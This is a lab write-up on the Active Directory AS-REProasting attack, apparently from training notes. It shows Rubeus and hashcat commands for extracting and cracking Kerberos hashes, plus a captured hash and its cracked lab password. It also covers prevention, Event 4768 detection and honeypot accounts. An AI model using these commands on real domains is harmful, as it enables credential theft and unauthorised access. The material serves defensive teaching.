# AS-REProasting

## 📖 Description

The AS-REProasting attack is similar to the Kerberoasting attack; we can obtain crackable hashes for user accounts that have the property Do not require Kerberos preauthentication enabled. The success of this attack depends on the strength of the user account password that we will crack.

---

## 🔴 Attack

To obtain crackable hashes, we can use Rubeus again. However, this time, we will use the asreproast action. If we don't specify a name, Rubeus will extract hashes for each user that has Kerberos preauthentication not required:

```powershell id="r9w5x2"
PS C:\Users\bob\Downloads> .\Rubeus.exe asreproast /outfile:asrep.txt
```

<img width="660" height="527" alt="image" src="https://github.com/user-attachments/assets/0fb10c35-0cf7-46df-ad4b-3e5ce6b82568" />

<img width="1655" height="915" alt="image" src="https://github.com/user-attachments/assets/c6dd5c09-5c6e-4065-8c54-27d059aa99ed" />

Once Rubeus obtains the hash for the user Anni (the only one in the playground environment with preauthentication not required), we will move the output text file to a linux attacking machine.

For hashcat to be able to recognize the hash, we need to edit it by adding 23$ after $krb5asrep$:

```shellsession id="x7k3q1"
$krb5asrep$23$anni@eagle.local:1b912b858c4551c0013dbe81ff0f01d7$c64803358a43d05383e9e01374e8f2
```

We can now use hashcat with the hash-mode (option -m) 18200 for AS-REPRoastable hashes. We also pass a dictionary file with passwords (the file passwords.txt) and save the output of any successfully cracked tickets to the file asrepcracked.txt:

```shellsession id="n4m8v6"
@htb[/htb]$ sudo hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --force
```

<img width="635" height="764" alt="image" src="https://github.com/user-attachments/assets/25ab08a6-a985-40dd-8d43-1d8b1086c598" />

<img width="1443" height="1449" alt="image" src="https://github.com/user-attachments/assets/69461513-8f4c-4fcb-ab90-9ea961ad5089" />

Once hashcat cracks the password, we can print the contents of the output file to obtain the cleartext password Slavi123:

```shellsession id="b6t2p9"
@htb[/htb]$ sudo cat asrepcrack.txt

$krb5asrep$23$anni@eagle.local:1b912b858c4551c0013dbe81ff0f01d7$c64803358a43d05383e9e01374e8f2b2c92f9d6c669cdc4a1b9c1ed684c7857c965b8e44a285bc0e2f1bc248159aa7448494de4c1f997382518278e375a7a4960153e13dae1cd28d05b7f2377a038062f8e751c1621828b100417f50ce617278747d9af35581e38c381bb0a3ff246912def5dd2d53f875f0a64c46349fdf3d7ed0d8ff5a08f2b78d83a97865a3ea2f873be57f13b4016331eef74e827a17846cb49ccf982e31460ab25c017fd44d46cd8f545db00b6578150a4c59150fbec18f0a2472b18c5123c34e661cc8b52dfee9c93dd86e0afa66524994b04c5456c1e71ccbd2183ba0c43d2550:Slavi123
```

<img width="1746" height="159" alt="image" src="https://github.com/user-attachments/assets/cea135f3-335a-4a5e-adcb-d22d43720333" />

---

## 🛡️ Prevention

As mentioned before, the success of this attack depends on the strength of the password of users with Do not require Kerberos preauthentication configured.

First and foremost, we should only use this property if needed; a good practice is to review accounts quarterly to ensure that we have not assigned this property. Because this property is often found with some regular user accounts, they tend to have easier-to-crack passwords than service accounts with SPNs (those from Kerberoast). Therefore, for users requiring this configured, we should assign a separate password policy, which requires at least 20 characters to thwart cracking attempts.

---

## 🔎 Detection

When we executed Rubeus, an Event with ID 4768 was generated, signaling that a Kerberos Authentication ticket was generated:

<img width="1799" height="872" alt="image" src="https://github.com/user-attachments/assets/b50543cc-7709-4a1e-843e-2398f74c6aaf" />

The caveat is that AD generates this event for every user that authenticates with Kerberos to any device; therefore, the presence of this event is very abundant. However, it is possible to know where the user authenticated from, which we can then use to correlate known good logins against potential malicious hash extractions. It may be hard to inspect specific IP addresses, especially if a user moves around office locations. However, it is possible to scrutinize the particular VLAN and alert on anything outside it.

Another field we should focus on is the Pre-Authentication Type, which holds information related to the type of request. Tools that take advantage of the "Do not require Kerberos preauthentication" option on a domain user account generate the 0 type in the event related to logon without Pre-Authentication. Commonly, these tools will target weak encryption types such as RC4 (0x17 within the Ticket Encryption Type field of the event. Rubeus defaults to using the RC4 encryption type, as we can see in the source code.

---

## 🪤 Honeypot

For this attack, a honeypot user is an excellent detection option to configure in AD environments; this must be a user with no real use/need in the environment, such that no login attempts are performed regularly. Therefore, any attempt(s) to perform a login for this account is likely malicious and requires inspection.

However, suppose the honeypot user is the only account with Kerberos Pre-Authentication not required. In that case, there might be better detection methods, as it would be very obvious for advanced threat actors that it is a honeypot user, resulting in them avoiding interactions with it. (I did previously hear from an organization that needed one of these accounts (application related) that the 'security through obscurity' behind having only one of these accounts may save them, as attackers will avoid going after it thinking it is a honeypot user. While it may be true in some instances, we should not let a glimpse of hope dictate the security state of the environment.)

To make a good honeypot user, we should ensure the following:

* The account must be a relatively old user, ideally one that has become bogus (advanced threat actors will not request tickets for new accounts because they likely have strong passwords and the possibility of being a honeypot user).
* For a service account user, the password should ideally be over two years old. For regular users, maintain the password so it does not become older than one year.
* The account must have logins after the day the password was changed; otherwise, it becomes self-evident if the last password change day is the same as the previous login.
* The account must have some privileges assigned to it; otherwise, it won't be interesting to try to crack its password's hash.

If we go back to our playground environment and configure the user 'svc-iam' (presumably an old IAM account leftover) with the recommendations above, then any request to obtain a TGT for that account should be alerted on. The event received would look like this:

<img width="1261" height="1148" alt="image" src="https://github.com/user-attachments/assets/eb2da46a-b2ae-44ae-a050-d92597d7129b" />
